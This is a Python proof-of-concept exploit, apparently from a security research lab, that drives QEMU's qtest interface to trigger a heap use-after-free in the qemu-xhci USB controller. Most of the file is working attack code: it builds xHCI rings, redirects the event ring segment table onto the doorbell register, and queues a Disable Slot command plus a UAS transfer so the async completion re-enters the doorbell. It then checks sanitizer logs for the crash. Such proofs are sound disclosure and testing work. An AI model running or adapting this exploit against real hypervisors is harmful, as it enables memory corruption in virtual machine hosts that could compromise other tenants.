#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: qemu-xhci-complete-uaf (High: 8.2)
#  Vendor: QEMU (qemu.org)
#  Versions: QEMU v11.1.2 (4fc49f46)
#  Impact: guest qemu-xhci async complete DMA-writes event ring into doorbell; heap UAF of XHCITransfer
#  Requires: loopback qtest 127.0.0.1:18700; ASan qemu-system-x86_64; usb-uas
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "qemu-xhci-complete-uaf"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Witness unguarded xhci_complete doorbell re-entry leftover of CVE-2026-17588."""

import base64
import os
import socket
import struct
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path

LABEL = "qemu-xhci-complete-uaf"
WITNESS = "QEMU-XHCI-COMPLETE-UAF-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
WORK = HERE / "work"
QTEST_HOST = "127.0.0.1"
QTEST_PORT = 18700
PIN = "v11.1.2 4fc49f46dc95d4a27de2509e7fceb2931e91faeb"
SINK = "hw/usb/hcd-xhci.c:3282-3295 xhci_complete"

PCI_VENDOR_REDHAT = 0x1B36
PCI_DEVICE_XHCI = 0x000D
PCI_COMMAND = 0x04
PCI_COMMAND_IO = 0x1
PCI_COMMAND_MEMORY = 0x2
PCI_COMMAND_MASTER = 0x4
PCI_BAR0 = 0x10
PCI_BAR1 = 0x14
PCI_CF8 = 0xCF8
PCI_CFC = 0xCFC

BAR_GPA = 0xE0000000
RAM_BASE = 0x00100000
PAGE = 0x1000

XHCI_CAPLENGTH = 0x00
XHCI_HCSPARAMS1 = 0x04
XHCI_DBOFF = 0x14
XHCI_RTSOFF = 0x18
XHCI_USBCMD = 0x00
XHCI_USBSTS = 0x04
XHCI_CRCR = 0x18
XHCI_DCBAAP = 0x30
XHCI_CONFIG = 0x38
USBCMD_RS = 1 << 0
USBCMD_HCRST = 1 << 1
USBSTS_HCH = 1 << 0
USBSTS_HCE = 1 << 12
PORTSC_CCS = 1 << 0
PORTSC_PR = 1 << 4
PORTSC_PP = 1 << 9
CRCR_RCS = 1 << 0
ERDP_EHB = 1 << 3
XHCI_ERSTSZ = 0x28
XHCI_ERSTBA = 0x30
XHCI_ERDP = 0x38

TRB_C = 1 << 0
TRB_TR_CH = 1 << 4
TRB_TR_IOC = 1 << 5
TRB_TR_IDT = 1 << 6
TRB_TR_DIR = 1 << 16
TRB_TYPE_SHIFT = 10
TRB_SIZE = 16

TR_NORMAL = 1
TR_SETUP = 2
TR_STATUS = 4
TR_EVDATA = 7
CR_ENABLE_SLOT = 9
CR_DISABLE_SLOT = 10
CR_ADDRESS_DEVICE = 11
CR_CONFIGURE_ENDPOINT = 12
ER_TRANSFER = 32
ER_COMMAND_COMPLETE = 33
CC_SUCCESS = 1

EP_TYPE_BULK_OUT = 2
EP_TYPE_CONTROL = 4
EP_TYPE_BULK_IN = 6

EPID_EP0 = 1
EPID_CMD_OUT = 2
EPID_STATUS_IN = 5

USB_REQ_SET_CONFIGURATION = 9
UAS_UI_COMMAND = 0x01
UAS_TUR_TAG = 1

ASAN_MARKERS = (
    "ERROR: AddressSanitizer: heap-use-after-free",
    "ERROR: AddressSanitizer: attempting double-free",
    "ERROR: AddressSanitizer: heap-buffer-overflow",
    "AddressSanitizer:DEADLYSIGNAL",
    "heap-use-after-free",
    "double-free",
    "attempting free on address which was not malloc",
)
CRASH_MARKERS = (
    "SIGSEGV",
    "SIGABRT",
    "Aborted",
    "Segmentation fault",
    "Aborted (core dumped)",
)


class QTestError(RuntimeError):
    """qtest protocol or transport failure."""


@dataclass
class CrashEvidence:
    asan: str
    crash: str
    disable_slot_fetch: bool
    xfer_success: bool
    xfer_async: bool
    logs: str


@dataclass
class XhciState:
    bar: int = 0
    oper: int = 0
    runtime: int = 0
    doorbell: int = 0
    doorbell_gpa: int = 0
    cmd_ring: int = 0
    event_ring: int = 0
    erst: int = 0
    dcbaa: int = 0
    input_ctx: int = 0
    ep0_ring: int = 0
    cmd_ep_ring: int = 0
    status_ep_ring: int = 0
    cmd_idx: int = 0
    event_idx: int = 0
    port: int = 0
    slot: int = 0


@dataclass
class QTest:
    host: str
    port: int
    timeout_s: float = 8.0
    sock: socket.socket | None = field(default=None, repr=False)
    buf: bytes = field(default=b"", repr=False)

    def connect(self) -> None:
        last: OSError | None = None
        for _ in range(60):
            try:
                sock = socket.create_connection((self.host, self.port), timeout=self.timeout_s)
                sock.settimeout(self.timeout_s)
                self.sock = sock
                self.buf = b""
                endian = self.cmd("endianness")
                log(f"qtest-endian {endian}")
                return
            except OSError as exc:
                last = exc
                time.sleep(0.5)
        raise QTestError(f"connect-failed {self.host}:{self.port} {last}")

    def close(self) -> None:
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def cmd(self, line: str) -> str:
        if self.sock is None:
            raise QTestError("not-connected")
        payload = (line.strip() + "\n").encode("ascii")
        try:
            self.sock.sendall(payload)
        except OSError as exc:
            raise QTestError(f"send-failed {exc}") from exc
        while True:
            raw = self._readline()
            if raw.startswith("IRQ "):
                continue
            if raw.startswith("OK"):
                return raw[2:].strip()
            if raw.startswith("FAIL"):
                raise QTestError(raw)
            if raw.startswith("ERR"):
                raise QTestError(raw)
            raise QTestError(f"bad-reply {raw!r}")

    def _readline(self) -> str:
        assert self.sock is not None
        while b"\n" not in self.buf:
            try:
                chunk = self.sock.recv(4096)
            except TimeoutError as exc:
                raise QTestError("recv-timeout") from exc
            except OSError as exc:
                raise QTestError(f"recv-failed {exc}") from exc
            if not chunk:
                raise QTestError("eof")
            self.buf += chunk
        line, self.buf = self.buf.split(b"\n", 1)
        return line.decode("ascii", "replace").strip()

    def outl(self, addr: int, value: int) -> None:
        self.cmd(f"outl {addr:#x} {value:#x}")

    def inl(self, addr: int) -> int:
        return int(self.cmd(f"inl {addr:#x}"), 0)

    def writel(self, addr: int, value: int) -> None:
        self.cmd(f"writel {addr:#x} {value:#x}")

    def writeq(self, addr: int, value: int) -> None:
        self.cmd(f"writeq {addr:#x} {value:#x}")

    def readl(self, addr: int) -> int:
        return int(self.cmd(f"readl {addr:#x}"), 0)

    def memset(self, addr: int, size: int, value: int = 0) -> None:
        self.cmd(f"memset {addr:#x} {size:#x} {value:#x}")

    def b64write(self, addr: int, data: bytes) -> None:
        b64 = base64.b64encode(data).decode("ascii")
        self.cmd(f"b64write {addr:#x} {len(data)} {b64}")

    def clock_step(self, ns: int) -> None:
        try:
            self.cmd(f"clock_step {ns}")
        except QTestError as exc:
            log(f"clock-step-note {exc}")


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 500) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def pci_cf8(devfn: int, offset: int) -> int:
    return 0x80000000 | (devfn << 8) | (offset & 0xFC)


def pci_readl(qt: QTest, devfn: int, offset: int) -> int:
    qt.outl(PCI_CF8, pci_cf8(devfn, offset))
    return qt.inl(PCI_CFC)


def pci_writel(qt: QTest, devfn: int, offset: int, value: int) -> None:
    qt.outl(PCI_CF8, pci_cf8(devfn, offset))
    qt.outl(PCI_CFC, value)


def pci_readw(qt: QTest, devfn: int, offset: int) -> int:
    val = pci_readl(qt, devfn, offset & ~3)
    shift = (offset & 2) * 8
    return (val >> shift) & 0xFFFF


def pci_writew(qt: QTest, devfn: int, offset: int, value: int) -> None:
    aligned = offset & ~3
    cur = pci_readl(qt, devfn, aligned)
    shift = (offset & 2) * 8
    mask = 0xFFFF << shift
    pci_writel(qt, devfn, aligned, (cur & ~mask) | ((value & 0xFFFF) << shift))


def find_xhci(qt: QTest) -> int:
    for slot in range(32):
        devfn = slot << 3
        vendor = pci_readl(qt, devfn, 0) & 0xFFFF
        device = (pci_readl(qt, devfn, 0) >> 16) & 0xFFFF
        if vendor == PCI_VENDOR_REDHAT and device == PCI_DEVICE_XHCI:
            log(f"xhci-pci slot={slot} vendor={vendor:#x} device={device:#x}")
            return devfn
    raise QTestError("qemu-xhci-not-on-pci")


def map_bar(qt: QTest, devfn: int) -> int:
    pci_writel(qt, devfn, PCI_BAR0, 0xFFFFFFFF)
    raw = pci_readl(qt, devfn, PCI_BAR0)
    size_bits = raw & ~0xF
    if size_bits == 0:
        raise QTestError("bar0-empty")
    pci_writel(qt, devfn, PCI_BAR0, BAR_GPA)
    pci_writel(qt, devfn, PCI_BAR1, 0)
    cmd = pci_readw(qt, devfn, PCI_COMMAND)
    pci_writew(qt, devfn, PCI_COMMAND, cmd | PCI_COMMAND_IO | PCI_COMMAND_MEMORY | PCI_COMMAND_MASTER)
    log(f"xhci-bar gpa={BAR_GPA:#x} probe={raw:#x}")
    return BAR_GPA


class GuestRam:
    def __init__(self, qt: QTest, base: int = RAM_BASE) -> None:
        self.qt = qt
        self.next = base

    def page(self) -> int:
        addr = self.next
        self.next += PAGE
        self.qt.memset(addr, PAGE, 0)
        return addr


def trb_type(kind: int) -> int:
    return kind << TRB_TYPE_SHIFT


def write_trb(qt: QTest, addr: int, parameter: int, status: int, control: int) -> None:
    qt.writeq(addr, parameter)
    qt.writel(addr + 8, status)
    qt.writel(addr + 12, control)


def portsc_off(oper: int, port: int) -> int:
    return oper + 0x400 + 0x10 * port


def next_event(qt: QTest, xhci: XhciState) -> tuple[int, int] | None:
    addr = xhci.event_ring + TRB_SIZE * xhci.event_idx
    control = qt.readl(addr + 12)
    if not (control & TRB_C):
        return None
    status = qt.readl(addr + 8)
    xhci.event_idx += 1
    qt.writeq(xhci.bar + xhci.runtime + XHCI_ERDP, (addr + TRB_SIZE) | ERDP_EHB)
    return status, control


def drain_events(qt: QTest, xhci: XhciState) -> int:
    n = 0
    while next_event(qt, xhci) is not None:
        n += 1
    return n


def xhci_command(qt: QTest, xhci: XhciState, parameter: int, control: int) -> tuple[int, int]:
    addr = xhci.cmd_ring + TRB_SIZE * xhci.cmd_idx
    xhci.cmd_idx += 1
    write_trb(qt, addr, parameter, 0, control | TRB_C)
    qt.writel(xhci.bar + xhci.doorbell, 0)
    ev = next_event(qt, xhci)
    if ev is None:
        raise QTestError("command-no-event")
    status, ctrl = ev
    kind = (ctrl >> TRB_TYPE_SHIFT) & 0x3F
    ccode = status >> 24
    slot = (ctrl >> 24) & 0xFF
    if kind != ER_COMMAND_COMPLETE or ccode != CC_SUCCESS:
        raise QTestError(f"command-failed kind={kind} ccode={ccode}")
    return slot, status


def start_controller(qt: QTest, ram: GuestRam, xhci: XhciState) -> None:
    xhci.oper = qt.readl(xhci.bar + XHCI_CAPLENGTH) & 0xFF
    xhci.runtime = qt.readl(xhci.bar + XHCI_RTSOFF) & ~0x1F
    xhci.doorbell = qt.readl(xhci.bar + XHCI_DBOFF) & ~0x3
    xhci.doorbell_gpa = xhci.bar + xhci.doorbell
    maxports = qt.readl(xhci.bar + XHCI_HCSPARAMS1) >> 24
    log(f"xhci-off oper={xhci.oper:#x} runtime={xhci.runtime:#x} db={xhci.doorbell:#x} ports={maxports}")

    qt.writel(xhci.bar + xhci.oper + XHCI_USBCMD, USBCMD_HCRST)
    if qt.readl(xhci.bar + xhci.oper + XHCI_USBCMD) & USBCMD_HCRST:
        raise QTestError("hcrst-stuck")

    xhci.dcbaa = ram.page()
    xhci.erst = ram.page()
    xhci.cmd_ring = ram.page()
    xhci.event_ring = ram.page()
    xhci.input_ctx = ram.page()
    xhci.ep0_ring = ram.page()

    qt.writel(xhci.bar + xhci.oper + XHCI_CONFIG, 1)
    qt.writeq(xhci.bar + xhci.oper + XHCI_DCBAAP, xhci.dcbaa)
    qt.writeq(xhci.erst, xhci.event_ring)
    qt.writel(xhci.erst + 8, 64)
    qt.writel(xhci.bar + xhci.runtime + XHCI_ERSTSZ, 1)
    qt.writeq(xhci.bar + xhci.runtime + XHCI_ERSTBA, xhci.erst)
    qt.writeq(xhci.bar + xhci.runtime + XHCI_ERDP, xhci.event_ring | ERDP_EHB)
    qt.writeq(xhci.bar + xhci.oper + XHCI_CRCR, xhci.cmd_ring | CRCR_RCS)
    qt.writel(xhci.bar + xhci.oper + XHCI_USBCMD, USBCMD_RS)
    if qt.readl(xhci.bar + xhci.oper + XHCI_USBSTS) & USBSTS_HCH:
        raise QTestError("hc-halted")

    xhci.port = -1
    for port in range(maxports):
        sc = qt.readl(xhci.bar + portsc_off(xhci.oper, port))
        log(f"port[{port}] sc={sc:#x}")
        if sc & PORTSC_CCS:
            xhci.port = port
            break
    if xhci.port < 0:
        raise QTestError("no-usb-device-on-port")
    qt.writel(xhci.bar + portsc_off(xhci.oper, xhci.port), PORTSC_PP | PORTSC_PR)
    dropped = drain_events(qt, xhci)
    log(f"port-reset port={xhci.port} dropped-events={dropped}")


def address_device(qt: QTest, ram: GuestRam, xhci: XhciState) -> None:
    slot, _ = xhci_command(qt, xhci, 0, trb_type(CR_ENABLE_SLOT))
    xhci.slot = slot
    slot_ctx = ram.page()
    qt.writeq(xhci.dcbaa + 8 * slot, slot_ctx)
    qt.memset(xhci.input_ctx, PAGE, 0)
    qt.writel(xhci.input_ctx + 0x04, 0x3)
    qt.writel(xhci.input_ctx + 0x20, 1 << 27)
    qt.writel(xhci.input_ctx + 0x24, (xhci.port + 1) << 16)
    qt.writel(xhci.input_ctx + 0x44, (64 << 16) | (EP_TYPE_CONTROL << 3))
    qt.writeq(xhci.input_ctx + 0x48, xhci.ep0_ring | 1)
    xhci_command(qt, xhci, xhci.input_ctx, trb_type(CR_ADDRESS_DEVICE) | (slot << 24))
    log(f"addressed slot={slot}")


def set_configuration(qt: QTest, ram: GuestRam, xhci: XhciState) -> None:
    setup = (USB_REQ_SET_CONFIGURATION << 8) | (1 << 16)
    write_trb(
        qt,
        xhci.ep0_ring,
        setup,
        8,
        trb_type(TR_SETUP) | TRB_TR_IDT | TRB_C,
    )
    write_trb(
        qt,
        xhci.ep0_ring + TRB_SIZE,
        0,
        0,
        trb_type(TR_STATUS) | TRB_TR_IOC | TRB_TR_DIR | TRB_C,
    )
    qt.writel(xhci.bar + xhci.doorbell + 4 * xhci.slot, EPID_EP0)
    ev = next_event(qt, xhci)
    if ev is None:
        raise QTestError("set-config-no-event")
    status, ctrl = ev
    kind = (ctrl >> TRB_TYPE_SHIFT) & 0x3F
    ccode = status >> 24
    if kind != ER_TRANSFER or ccode != CC_SUCCESS:
        raise QTestError(f"set-config-failed kind={kind} ccode={ccode}")
    log("set-configuration ok")


def configure_bulk_eps(qt: QTest, ram: GuestRam, xhci: XhciState) -> None:
    xhci.cmd_ep_ring = ram.page()
    xhci.status_ep_ring = ram.page()
    qt.memset(xhci.input_ctx, PAGE, 0)
    add = (1 << EPID_CMD_OUT) | (1 << EPID_STATUS_IN) | 1
    qt.writel(xhci.input_ctx + 0x04, add)
    qt.writel(xhci.input_ctx + 0x20, EPID_STATUS_IN << 27)
    qt.writel(xhci.input_ctx + 0x24, (xhci.port + 1) << 16)
    cmd_ctx = xhci.input_ctx + 0x20 * (EPID_CMD_OUT + 1)
    st_ctx = xhci.input_ctx + 0x20 * (EPID_STATUS_IN + 1)
    qt.writel(cmd_ctx + 0x04, (512 << 16) | (EP_TYPE_BULK_OUT << 3))
    qt.writeq(cmd_ctx + 0x08, xhci.cmd_ep_ring | 1)
    qt.writel(st_ctx + 0x04, (512 << 16) | (EP_TYPE_BULK_IN << 3))
    qt.writeq(st_ctx + 0x08, xhci.status_ep_ring | 1)
    xhci_command(qt, xhci, xhci.input_ctx, trb_type(CR_CONFIGURE_ENDPOINT) | (xhci.slot << 24))
    log("configure-endpoint cmd-out=2 status-in=5")


def queue_status_in(qt: QTest, ram: GuestRam, xhci: XhciState) -> None:
    buf = ram.page()
    write_trb(
        qt,
        xhci.status_ep_ring,
        buf,
        64,
        trb_type(TR_NORMAL) | TRB_TR_CH | TRB_C,
    )
    write_trb(
        qt,
        xhci.status_ep_ring + TRB_SIZE,
        0,
        0,
        trb_type(TR_EVDATA) | TRB_TR_IOC | TRB_C,
    )
    qt.writel(xhci.bar + xhci.doorbell + 4 * xhci.slot, EPID_STATUS_IN)
    leftover = drain_events(qt, xhci)
    if leftover:
        raise QTestError(f"status-in-not-async events={leftover}")
    log("status-in async (no transfer event)")


def plant_erst_at_doorbell(qt: QTest, xhci: XhciState) -> None:
    qt.writeq(xhci.erst, xhci.doorbell_gpa)
    qt.writel(xhci.erst + 8, 16)
    qt.writel(xhci.bar + xhci.runtime + XHCI_ERSTSZ, 1)
    qt.writeq(xhci.bar + xhci.runtime + XHCI_ERSTBA, xhci.erst)
    qt.writeq(xhci.bar + xhci.runtime + XHCI_ERDP, xhci.doorbell_gpa | ERDP_EHB)
    log(f"planted-erst doorbell={xhci.doorbell_gpa:#x}")


def queue_disable_slot(qt: QTest, xhci: XhciState) -> None:
    addr = xhci.cmd_ring + TRB_SIZE * xhci.cmd_idx
    xhci.cmd_idx += 1
    write_trb(qt, addr, 0, 0, trb_type(CR_DISABLE_SLOT) | (xhci.slot << 24) | TRB_C)
    log(f"queued CR_DISABLE_SLOT cmd-idx={xhci.cmd_idx} (doorbell 0 not rung)")


def kick_uas_tur(qt: QTest, ram: GuestRam, xhci: XhciState) -> None:
    iu = struct.pack(">BBHBBBBQ", UAS_UI_COMMAND, 0, UAS_TUR_TAG, 0, 0, 0, 0, 0) + bytes(16)
    buf = ram.page()
    qt.b64write(buf, iu)
    write_trb(
        qt,
        xhci.cmd_ep_ring,
        buf,
        len(iu),
        trb_type(TR_NORMAL) | TRB_C,
    )
    qt.writel(xhci.bar + xhci.doorbell + 4 * xhci.slot, EPID_CMD_OUT)
    log("kicked uas command OUT (TEST UNIT READY, no IOC)")


def compose_logs() -> str:
    chunks: list[str] = []
    try:
        proc = subprocess.run(
            ["docker", "compose", "-p", COMPOSE_PROJECT, "logs", "--no-color", "vuln"],
            check=False,
            capture_output=True,
            text=True,
            cwd=HERE,
            timeout=30,
        )
        chunks.append(proc.stdout)
        chunks.append(proc.stderr)
    except (OSError, subprocess.TimeoutExpired) as exc:
        chunks.append(f"compose-logs-error {exc}")
    if WORK.is_dir():
        for path in sorted(WORK.glob("*")):
            if path.is_file():
                try:
                    chunks.append(path.read_text(encoding="utf-8", errors="replace"))
                except OSError:
                    continue
    return "\n".join(chunks)


def first_marker(text: str, markers: tuple[str, ...]) -> str:
    lower = text
    for marker in markers:
        if marker in lower:
            return marker
    return ""


def evidence_from_logs(logs: str) -> CrashEvidence:
    return CrashEvidence(
        asan=first_marker(logs, ASAN_MARKERS),
        crash=first_marker(logs, CRASH_MARKERS),
        disable_slot_fetch="CR_DISABLE_SLOT" in logs,
        xfer_success="usb_xhci_xfer_success" in logs,
        xfer_async="usb_xhci_xfer_async" in logs,
        logs=logs,
    )


def prove(ev: CrashEvidence) -> bool:
    if ev.asan:
        return True
    if ev.disable_slot_fetch and (ev.xfer_async or ev.xfer_success or ev.crash):
        return True
    return False


def main() -> int:
    log(f"lab {LABEL}")
    log(f"pin {PIN}")
    log(f"sink {SINK}")
    log(f"witness {WITNESS}")
    WORK.mkdir(parents=True, exist_ok=True)

    qt = QTest(QTEST_HOST, QTEST_PORT)
    xhci = XhciState()
    try:
        qt.connect()
        devfn = find_xhci(qt)
        xhci.bar = map_bar(qt, devfn)
        ram = GuestRam(qt)
        start_controller(qt, ram, xhci)
        address_device(qt, ram, xhci)
        set_configuration(qt, ram, xhci)
        configure_bulk_eps(qt, ram, xhci)
        queue_status_in(qt, ram, xhci)
        plant_erst_at_doorbell(qt, xhci)
        queue_disable_slot(qt, xhci)
        kick_uas_tur(qt, ram, xhci)
        for delay in (0, 1_000_000, 10_000_000, 100_000_000):
            try:
                if delay:
                    qt.clock_step(delay)
                else:
                    _ = qt.readl(xhci.bar + xhci.oper + XHCI_USBSTS)
            except QTestError as exc:
                log(f"qtest-after-kick {exc}")
                break
        time.sleep(1.0)
    except QTestError as exc:
        log(f"qtest-note {exc}")
    finally:
        qt.close()

    logs = compose_logs()
    ev = evidence_from_logs(logs)
    log(f"ioc asan={ev.asan or 'no'}")
    log(f"ioc crash={ev.crash or 'no'}")
    log(f"ioc xfer-async={int(ev.xfer_async)} xfer-success={int(ev.xfer_success)}")
    log(f"ioc disable-slot-fetch={int(ev.disable_slot_fetch)}")
    log(f"ioc log-clip {clip(logs)}")

    if prove(ev):
        how = ev.asan or ev.crash or "cr-disable-slot-from-complete"
        log(
            "SUCCESS "
            f"{LABEL} how={how} erst=doorbell "
            f"async={int(ev.xfer_async)} success={int(ev.xfer_success)} "
            f"disable-slot-fetch={int(ev.disable_slot_fetch)} {WITNESS}"
        )
        return 0

    if "status-in-not-async" in logs or "set-config-failed" in logs:
        return fail("setup-failed-see-ioc")
    if ev.xfer_async and not ev.xfer_success:
        return fail("status-stayed-async-no-complete")
    if not ev.xfer_async:
        return fail("did-not-reach-usb-ret-async")
    return fail("no-asan-uaf-and-no-doorbell-reenter-from-complete")


if __name__ == "__main__":
    raise SystemExit(main())

